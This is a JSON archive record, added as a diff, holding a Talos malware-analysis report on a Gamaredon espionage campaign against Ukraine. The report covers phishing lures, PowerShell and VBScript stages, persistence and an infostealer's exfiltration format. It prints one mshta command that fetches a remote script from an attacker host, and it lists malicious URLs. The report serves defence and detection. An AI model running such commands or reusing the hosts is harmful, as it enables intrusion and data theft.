@@ -1,0 +1,124 @@
+{
+    "id": "c6b9f0a2-01d0-4a72-b4f8-32e291eac397",
+    "created_at": "2023-01-12T15:04:25.892915Z",
+    "updated_at": "2025-03-27T02:13:57.308046Z",
+    "deleted_at": null,
+    "sha1_hash": "87c5acdc90b17de7328e43802de4f6139474176f",
+    "title": "2022-09-15 - Gamaredon APT targets Ukrainian government agencies in new campaign",
+    "authors": "",
+    "file_creation_date": "2022-10-02T12:12:10Z",
+    "file_modification_date": "2022-10-02T12:12:10Z",
+    "file_size": 2772135,
+    "plain_text": "# Gamaredon APT targets Ukrainian government agencies in new campaign\n\n**[blog.talosintelligence.com/2022/09/gamaredon-apt-targets-ukrainian-agencies.html](https://blog.talosintelligence.com/2022/09/gamaredon-apt-targets-ukrainian-agencies.html)**\n\nBy [Asheer Malhotra and](https://twitter.com/asheermalhotra) [Guilherme Venere.](https://twitter.com/gvenere)\n\nCisco Talos recently identified a new, ongoing campaign attributed to the Russia-linked\n[Gamaredon APT that infects Ukrainian users with information-stealing malware.](https://attack.mitre.org/versions/v10/groups/G0047/)\nThe adversary is using phishing documents containing lures related to the Russian\ninvasion of Ukraine.\nLNK files, PowerShell and VBScript enable initial access, while malicious binaries are\ndeployed in the post-infection phase.\nWe discovered the use of a custom-made information stealer implant that can exfiltrate\nvictim files of interest and deploy additional payloads as directed by the attackers.\n\n[Cisco Talos discovered Gamaredon APT activity targeting users in Ukraine with malicious](https://blog.talosintelligence.com/2021/02/gamaredonactivities.html)\nLNK files distributed in RAR archives. The campaign, part of an ongoing espionage\noperation observed as recently as August 2022, aims to deliver information-stealing malware\nto Ukrainian victim machines and makes heavy use of multiple modular PowerShell and\nVBScript (VBS) scripts as part of the infection chain. The infostealer is a dual-purpose\nmalware that includes capabilities for exfiltrating specific file types and deploying additional\nbinary and script-based payloads on an infected endpoint.\n\n\n-----\n\nThe adversary uses phishing emails to deliver Microsoft Office documents containing remote\ntemplates with malicious VBScript macros. These macros download and open RAR archives\ncontaining LNK files that subsequently download and activate the next-stage payload on the\ninfected endpoint. We observed considerable overlap between the tactics, techniques and\nprocedures (TTPs), malware artifacts and infrastructure used in this campaign and those\nused in a [series of attacks the Ukraine Computer Emergency Response Team (CERT-UA)](https://cert.gov.ua/article/971405)\n[recently attributed to Gamaredon.](https://cert.gov.ua/article/1229152)\n\nWe also observed intrusion attempts against several Ukrainian entities. Based on these\nobservations and Gamaredon's operational history of almost exclusively targeting Ukraine,\nwe assess that this latest campaign is almost certainly directly targeting entities based in\nUkraine.\n\n## Attack Chain\n\n### Initial Access\n\nGamaredon APT actors likely gained initial footholds into targeted networks through\nmalicious Microsoft Office documents distributed via email. This is consistent with spearphishing techniques common to this APT.\n\n\n-----\n\nMalicious VBS macros concealed within remote templates execute when the user opens the\ndocument. The macros download RAR archives containing LNK files. The naming\nconvention of the RAR archives in this campaign follows a similar pattern:\n\n31.07.2022.rar\n04.08.2022.rar\n10.08.2022.rar\n\nThese compressed archives usually contain just the LNK file. The LNK files and Microsoft\nOffice document names contain references pertinent to the Russian invasion of Ukraine:\n\n### Execution\n\nOnce opened, the LNKs will attempt to execute MSHTA.EXE to download and parse a\nremote XML file to execute a malicious PowerShell script:\n\nmshta.exe hxxp://a0704093.xsph[.]ru/bass/grudge.xml /f\n\n[Gamaredon is known to use the domain xsph[.]ru. The servers in this campaign only allow](https://cert.gov.ua/article/39386)\naccess from IP addresses inside the Ukrainian address space.\n\nThis PowerShell script decodes and executes a second PowerShell script (instrumentor),\nwhich collects data from the victim and reports back to a remote server. This script also\nallows the remote server to send a PowerShell command or binary blob containing encrypted\nVBScript (VBS) code to be executed locally:\n\n\n-----\n\n-----\n\nSecond-stage PowerShell script that runs additional commands and payloads on the\nendpoint.\n\nThe instrumentor PowerShell script usually consists of a function that decodes the encrypted\nresponse from the command and control (C2) server and executes it as a VBScript object.\nThe key used in the XOR decoder is calculated based on the machine's volume serial\nnumber plus index parameters passed in the response blob. This method makes it difficult to\ndecode the malicious content if an observer looking at the data doesn't have both\nparameters available.\n\nThe PowerShell script also repeatedly captures the current user's screen. This code uses the\n\"System.Windows.Forms\" object to capture a copy of the virtual desktop, including setups\nwith multiple screens. The screen capture is executed nine times, but the resulting\nscreenshot is always saved to \"%TEMP%\\test.png\", which gets overwritten every time. The\nresulting image (PNG file) is then converted to a base64-encoded string, stored in a variable\nand the screenshot image file is removed from the disk.\n\nThe script then proceeds to upload the victim's information to the remote server. The\nfollowing information is then collected and exfiltrated to a hardcoded C2 URL:\n\nComputer name.\nVolume serial number.\nBase64-encoded screenshot.\n\nUpon sending the system information, the server response is parsed to see if there are\ncommands to be executed. The entire script runs up to four times, thus up to four different\ncommands can be executed each time.\n\nThe code checks if the first character is an exclamation point (\"!\"). If so, the remainder of the\nresponse is expected to be a PowerShell code that is passed directly to the command IEX.\nThe output of that command is then added to the variable \"cmd\" and sent back to the C2\nserver.\n\nIf the response starts with any other character, it is treated as an encrypted blob and passed\nto the decoder function, along with the volume serial number to be decoded and executed as\nVBScript.\n\n\n-----\n\nInfection chain diagram.\n\n## Payloads\n\n### Yet another PowerShell script\n\nOne of the payloads served to the instrumentor script was PowerShell code used to set an\nenvironmental variable with PowerShell code in it and a Registry RUN key to run every time\nthe user logs in.\n\n\n-----\n\nPowerShell script setting up the RUN key to execute another PowerShell script stored in the\nenvironment variable.\n\nThere are two key components to this script:\n\nThe Get-IP function: This function queries a DNS lookup service for an attackerspecified domain and uses one of the returned IP addresses as the IP to download the\nnext payloads.\nNext-stage payload: The PowerShell script uses the IP address to construct a URL that\nserves the next-stage PowerShell script, which is subsequently stored in \"$env:Include\"\nand executed when the user logs in (via the HKCU\\\\Run key).\n\nPersistence script fetching the remote location's IP.\n\n\n-----\n\nThe PowerShell code residing in the environment variable is meant to provide the attackers\nwith continued access to the infected endpoint with the capability to deploy additional\n[payloads as desired. A similar PowerShell script was described in CERT-UA's recent alert](https://cert.gov.ua/article/1229152)\ndescribing intrusions conducted by Gamaredon in the first half of 2022 using the\nGammaLoad and GammaSteel implants.\n\n\n-----\n\nPowerShell script stored in the env variable.\n\nThis script uses the same Get-IP() function to get a random IP assigned to the domain and\nqueries a URL constructed from the IP address and a hardcoded extended resource. Just\nlike the previous script, the computer name and volume serial number are used again in\ncommunications with the C2 server. The C2 server uses them to encode the next-stage\npayload subsequently served to the script.\n\nIf the response from the C2 starts with the string \"http\", the content is treated as the URL to\ndownload the final payload binary. The Volume Serial Number and Computer Name are\npassed to this URL and the response is decoded using the XorBytes function.\n\nPowerShell function used to decode payloads from C2 server.\n\nThe decrypted binary is then saved to the \"%TEMP%\" folder with a name consisting of a\nrandom string of numbers and the \".exe\" file extension and is executed.\n\nAlternatively, if the response from the C2 does not begin with the \"http\" string, the content is\ntreated as a VBS and executed via a COM object.\n\n### Infostealer\n\nOne of the executables deployed by the attackers via the PowerShell script consisted of an\ninformation stealer that exfiltrates files of specific extensions from the infected endpoint: .doc,\n.docx, .xls, .rtf, .odt, .txt, .jpg, .jpeg, .pdf, .ps1, .rar, .zip, .7z and .mdb. This is a new\ninfostealer that Gamaredon has not previously used in other campaigns. We suspect it may\nbe a component of Gamaredon's \"Giddome'' backdoor family, but we are unable to confirm\nthat at this time.\n\nThe malicious binary keeps track of what has been exfiltrated in a file named \"profiles_c.ini\"\nin the \"%USERPROFILE%\\Appdata\\Local\" folder. The malware stores the MD5 hash of a\nstring containing the filename, file size and modification date of the exfiltrated file.\n\n\n-----\n\nOnce started, the malware scans all attached storage devices looking for files with the\naforementioned extensions. For each one, the malware makes a POST request with\nmetadata about the exfiltrated file and its content.\n\nPOST data to exfiltrate files.\n\nThe parameter \"p\" contains metadata about the stolen file and the victim machine using the\nfollowing format:\n\n%u&&%s&&%s&&%s&&%s&&%s\n\nWhere the various parameters are:\n\n<Hard_coded_value>&&<File_name>&&<File_Modification_Date_time>&&\n<FileSize>&&__&&<Computer_Name>&&<Username>&&\n<Victim_ID_randomly_generated_string_12_chars>&&<Volume Serial Number>\n\nThe raw content of the file comes after the metadata. The request is made to a random URI\nunder the parent C2 domain. The implant generates a random 12-character string that acts\nas a subdomain for the C2 domain to send requests to:\n\nE.g. <random_12_char_string>[.]celticso[.]ru\n\nThe implant will also search for the relevant file extensions in fixed and remote drives and\nspecifically in the \"C:\\Users\" folder. The implant enumerates all the files recursively in the\ndirectories on the system while avoiding enumeration of any folder containing the following\nstrings in the path:\n\nprogram files\n\n\n-----\n\nprogram files (x86)\nprogramdata\nperflogs\nprog\nwindows\nappdata\nlocal\nroaming\n\nAvoiding these folders is likely an attempt by the malware to avoid exfiltrating system files\nthereby focussing on user files of interest only.\n\nFor each file exfiltrated to the C2, the implant calculates the MD5 hash for the following\ninformation and stores it in the \"%LocalAppData%\\profiles_c.ini\" file:\n\n<file_path><File_size><File_modification_date_time>\n\nThe implant also steals files from removable drives connected to the infected endpoint.\nWhen the implant finds a removable drive, it looks for files with the file extensions listed\nearlier. Once a file is found, the implant creates a randomly named folder in the %TEMP%\ndirectory and copies the original file from its original location to:\n\n%Temp%\\<randomly_named_folder>\\connect\\<removable_vol_serial_number>\\<original file\npath>\n\nFor example, a user file found in a remote drive \"E:\" at path\n\"E:\\top_secret_docs\\isengard.doc\" will be copied to\n\n\"%temp%\\randomly_named_folder\\connect\\\n<removable_vol_serial_number>\\top_secret_docs\\isengard.doc\"\n\nThe contents of the folder in the temp directory are subsequently exfiltrated to the C2.\n\n**Deliver payloads**\n\nAs with this actor's previous tools (e.g., the PS1 scripts), this binary also parses the server\nresponse and downloads additional payloads if requested. The response from the server\nconsists of a flag indicating how the data should be treated:\n\n**Flag** **Payload Type** **Action**\n\n1 EXE Written to disk and executed.\n\n2 VBS Written to disk and executed using wscript.exe.\n\n\n-----\n\n**Flag** **Payload Type** **Action**\n\nAny other value Blob of data Written to a file on disk in the %TEMP% folder.\n\n\n-----\n\nCode depicting the dropping of additional payloads.\n\nThere are other indications this malware may be present on the system, listed below:\n\nA registry key is created under\nHKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run with the name \"Windows\nTask\" for persistence\nA mutex is created with the name Global\\flashupdate_r\n\n## Coverage\n\nWays our customers can detect and block this threat are listed below.\n\n\n-----\n\n[Cisco Secure Endpoint (formerly AMP for Endpoints) is ideally suited to prevent the](https://www.cisco.com/c/en/us/products/security/amp-for-endpoints/index.html)\n[execution of the malware detailed in this post. Try Secure Endpoint for free here.](https://www.cisco.com/c/en/us/products/security/amp-for-endpoints/free-trial.html?utm_medium%3Dweb-referral?utm_source%3Dcisco%26utm_campaign%3Damp-free-trial%26utm_term%3Dpgm-talos-trial%26utm_content%3Damp-free-trial)\n\n[Cisco Secure Web Appliance web scanning prevents access to malicious websites and](https://www.cisco.com/c/en/us/products/security/web-security-appliance/index.html)\ndetects malware used in these attacks.\n\n[Cisco Secure Email (formerly Cisco Email Security) can block malicious emails sent by](https://www.cisco.com/c/en/us/products/security/email-security/index.html)\nthreat actors as part of their campaign. You can try Secure Email for free [here.](https://www.cisco.com/c/en/us/products/security/cloud-mailbox-defense?utm_medium%3Dweb-referral%26utm_source%3Dcisco%26utm_campaign%3Dcmd-free-trial-request%26utm_term%3Dpgm-talos-trial)\n\n[Cisco Secure Firewall (formerly Next-Generation Firewall and Firepower NGFW) appliances](https://www.cisco.com/c/en/us/products/security/firewalls/index.html)\nsuch as [Threat Defense Virtual,](https://www.cisco.com/c/en/us/products/collateral/security/firepower-ngfw-virtual/datasheet-c78-742858.html) [Adaptive Security Appliance and](https://www.cisco.com/c/en/us/products/security/adaptive-security-appliance-asa-software/index.html) [Meraki MX can detect](https://meraki.cisco.com/products/appliances)\nmalicious activity associated with this threat.\n\n\n-----\n\n[Cisco Secure Malware Analytics (Threat Grid) identifies malicious binaries and builds](https://www.cisco.com/c/en/us/products/security/threat-grid/index.html)\nprotection into all Cisco Secure products.\n\n[Umbrella, Cisco's secure internet gateway (SIG), blocks users from connecting to malicious](https://umbrella.cisco.com/)\ndomains, IPs and URLs, whether users are on or off the corporate network. Sign up for a\n[free trial of Umbrella here.](https://signup.umbrella.com/?utm_medium%3Dweb-referral?utm_source%3Dcisco%26utm_campaign%3Dumbrella-free-trial%26utm_term%3Dpgm-talos-trial%26utm_content%3Dautomated-free-trial)\n\n[Cisco Secure Web Appliance (formerly Web Security Appliance) automatically blocks](https://www.cisco.com/c/en/us/products/security/web-security-appliance/index.html)\npotentially dangerous sites and tests suspicious sites before users access them.\n\nAdditional protections with context to your specific environment and threat data are available\nfrom the [Firewall Management Center.](https://www.cisco.com/c/en/us/products/security/firepower-management-center/index.html)\n\n[Cisco Duo provides multi-factor authentication for users to ensure only those authorized are](https://signup.duo.com/?utm_source%3Dtalos%26utm_medium%3Dreferral%26utm_campaign%3Dduo-free-trial)\naccessing your network.\n\nOpen-source Snort Subscriber Rule Set customers can stay up to date by downloading the\n[latest rule pack available for purchase on Snort.org. Snort Rules 60517-60539 are available](https://www.snort.org/products)\nfor this threat.\n\n**Orbital Queries**\n\n[Cisco Secure Endpoint users can use Orbital Advanced Search to run complex OSqueries to](https://orbital.amp.cisco.com/help/)\nsee if their endpoints are infected with this specific threat. For specific OSqueries on this\nthreat, click [here and](https://github.com/Cisco-Talos/osquery_queries/blob/master/win_malware/gamaredon_mutex.yaml) [here.](https://github.com/Cisco-Talos/osquery_queries/blob/master/win_malware/gamaredon_registry_key.yaml)\n\n## IOCs\n\n[The IOC list is also available in Talos' Github repo here.](https://github.com/Cisco-Talos/IOCs/tree/main/2022/09)\n\n**Malicious Documents**\n\n4aa2c783ae3d2d58f12d5e89282069533a80a7ba6f7fe6c548c6230a9601e650\n\n**LNK Files**\n\n581ed090237b314a9f5cd65076cd876c229e1d51328a24effd9c8d812eaebe6a\n\n34bf1a232870df28809597d49a70d9b549d776e1e4beb3308ff6d169a59ecd02\n\n78c6b489ac6cebf846aab3687bbe64801fdf924f36f312802c6bb815ed6400ba\n\n1cb2d299508739ae85d655efd6470c7402327d799eb4b69974e2efdb9226e447\n\na9916af0476243e6e0dbef9c45b955959772c4d18b7d1df583623e06414e53b7\n8294815c2342ff11739aff5a55c993f5dd23c6c7caff2ee770e69e88a7c4cb6a\n\nbe79d470c081975528c0736a0aa10214e10e182c8948bc4526138846512f19e7\n5264e8a8571fe0ef689933b8bc2ebe46b985c9263b24ea34e306d54358380cbb\n\n\n-----\n\nff7e8580ce6df5d5f5a2448b4646690a6f6d66b1db37f887b451665f4115d1a2\n1ec69271abd8ebd1a42ac1c2fa5cdd9373ff936dc73f246e7f77435c8fa0f84c\n\n**RAR Files**\n\n750bcec54a2e51f3409c83e2100dfb23d30391e20e1c8051c2bc695914c413e3\n\n**Infostealer**\n\n139547707f38622c67c8ce2c026bf32052edd4d344f03a0b37895b5de016641a\n\n**Malicious URLs**\n\nhxxp://a0698649.xsph[.]ru/barley/barley.xml\n\nhxxp://a0700343.xsph[.]ru/new/preach.xml\n\nhxxp://a0700462.xsph[.]ru/grow/guests.xml\n\nhxxp://a0700462.xsph[.]ru/seek/lost.xml\n\nhxxp://a0701919.xsph[.]ru/head/selling.xml\n\nhxxp://a0701919.xsph[.]ru/predator/decimal.xml\n\nhxxp://a0701919.xsph[.]ru/registry/prediction.xml\n\nhxxp://a0704093.xsph[.]ru/basement/insufficient.xml\n\nhxxp://a0704093.xsph[.]ru/bass/grudge.xml\n\nhxxp://a0705076.xsph[.]ru/ramzeses1.html\n\nhxxp://a0705076.xsph[.]ru/regiment.txt\n\nhxxp://a0705269.xsph[.]ru/bars/dearest.txt\n\nhxxp://a0705269.xsph[.]ru/instruct/deaf.txt\n\nhxxp://a0705269.xsph[.]ru/prok/gur.html\n\nhxxp://a0705581.xsph[.]ru/guinea/preservation.txt\n\nhxxp://a0705880.xsph[.]ru/band/sentiment.txt\n\nhxxp://a0705880.xsph[.]ru/based/pre.txt\n\nhxxp://a0705880.xsph[.]ru/selection/seedling.txt\n\nhxxp://a0706248.xsph[.]ru/reject/headlong.txt\n\nhxxp://a0707763.xsph[.]ru/decipher/prayer.txt\n\n**Additional Payload Drop Sites**\n\nhxxp://155.138.252[.]221/get.php\n\nhxxp://45.77.237[.]252/get.php\n\nhxxp://motoristo[.]ru/get.php\n\nhxxp://heato[.]ru/index.php\n\nhxxps://<random_string>.celticso[.]ru\n\n162[.]33[.]178[.]129\n\nkuckuduk[.]ru\n\npasamart[.]ru\n\ncelticso[ ]ru\n\n\n-----\n\n-----",
+    "language": "EN",
+    "sources": [
+        {
+            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
+            "created_at": "2023-01-12T14:38:44.599904Z",
+            "updated_at": "2023-01-12T14:38:44.599904Z",
+            "deleted_at": null,
+            "name": "VXUG",
+            "url": "https://www.vx-underground.org",
+            "description": "vx-underground Papers",
+            "reports": null
+        }
+    ],
+    "references": [
+        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2022/2022-09-15 - Gamaredon APT targets Ukrainian government agencies in new campaign.pdf"
+    ],
+    "report_names": [
+        "2022-09-15 - Gamaredon APT targets Ukrainian government agencies in new campaign.pdf"
+    ],
+    "threat_actors": [
+        {
+            "id": "d5156b55-5d7d-4fb2-836f-861d2e868147",
+            "created_at": "2023-01-06T13:46:38.557326Z",
+            "updated_at": "2025-03-27T02:00:02.861124Z",
+            "deleted_at": null,
+            "main_name": "Gamaredon Group",
+            "aliases": [
+                "Aqua Blizzard",
+                "Actinium",
+                "DEV-0157",
+                "Blue Otso",
+                "G0047",
+                "PRIMITIVE BEAR",
+                "Shuckworm",
+                "Trident Ursa",
+                "UAC-0010",
+                "Winterflounder",
+                "ACTINIUM",
+                "BlueAlpha",
+                "IRON TILDEN"
+            ],
+            "source_name": "MISPGALAXY:Gamaredon Group",
+            "tools": [],
+            "source_id": "MISPGALAXY",
+            "reports": null
+        },
+        {
+            "id": "236a8303-bf12-4787-b6d0-549b44271a19",
+            "created_at": "2024-06-04T02:03:07.966137Z",
+            "updated_at": "2025-03-27T02:05:17.410356Z",
+            "deleted_at": null,
+            "main_name": "IRON TILDEN",
+            "aliases": [
+                "Aqua Blizzard ",
+                "Armageddon",
+                "Blue Otso ",
+                "BlueAlpha ",
+                "Dancing Salome ",
+                "Gamaredon",
+                "Gamaredon Group",
+                "Hive0051 ",
+                "Primitive Bear ",
+                "Shuckworm ",
+                "Trident Ursa ",
+                "UAC-0010 ",
+                "UNC530 ",
+                "WinterFlounder ",
+                "ACTINIUM "
+            ],
+            "source_name": "Secureworks:IRON TILDEN",
+            "tools": [
+                "Pterodo"
+            ],
+            "source_id": "Secureworks",
+            "reports": null
+        },
+        {
+            "id": "4b066585-3591-4ddd-b3cc-f4e19e0e00ef",
+            "created_at": "2022-10-25T16:07:24.086915Z",
+            "updated_at": "2025-03-27T02:02:10.103556Z",
+            "deleted_at": null,
+            "main_name": "Putter Panda",
+            "aliases": [
+                "APT 2",
+                "Group 36",
+                "Putter Panda",
+                "SearchFire",
+                "TG-6952"
+            ],
+            "source_name": "ETDA:Putter Panda",
+            "tools": [
+                "3PARA RAT",
+                "4H RAT",
+                "4h_rat",
+                "MSUpdater",
+                "httpclient",
+                "pngdowner"
+            ],
+            "source_id": "ETDA",
+            "reports": null
+        }
+    ],
+    "ts_created_at": 1673535865,
+    "ts_updated_at": 1743041637,
+    "ts_creation_date": 1664712730,
+    "ts_modification_date": 1664712730,
+    "files": {
+        "pdf": "https://archive.orkl.eu/87c5acdc90b17de7328e43802de4f6139474176f.pdf",
+        "text": "https://archive.orkl.eu/87c5acdc90b17de7328e43802de4f6139474176f.txt",
+        "img": "https://archive.orkl.eu/87c5acdc90b17de7328e43802de4f6139474176f.jpg"
+    }
+}
